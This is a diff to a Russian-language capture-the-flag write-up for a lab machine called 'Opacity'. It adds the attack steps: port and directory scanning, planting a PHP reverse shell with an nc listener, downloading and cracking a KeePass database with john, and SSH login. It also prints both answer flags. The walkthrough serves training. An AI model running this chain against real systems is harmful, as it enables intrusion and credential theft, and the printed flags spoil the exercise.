@@ -13,9 +13,28 @@ Opacity — это простая машина, которая может пом
 ### Ответьте на вопросы ниже
 Что такое флаг local.txt?
 ```commandline
+nmap -sC -sV -p- <IP>
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://<IP>
+http://<IP>/cloud/
+/usr/share/webshells/php/php-reverse-shell.php
+nc -nvlp 1234
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+wget http://<IP>:8080/dataset.kdbx
+keepass2john dataset.kdbx > keepass.hash
+john keepass.hash --wordlist=/usr/share/wordlist/rockyou.txt
+keepassxc dataset.kdbx
+ssh sysadmin@<IP>
+cat local.txt
+
+```
+```commandline
 6661b61b44d234d230d06bf5b3c075e2
 ```
 Что такое флаг proof.txt?
+```commandline
+nc -nvlp 1235
+cat proof.txt
+```
 ```commandline
 ac0d56f93202dd57dcb2498c739fd20e
 ```
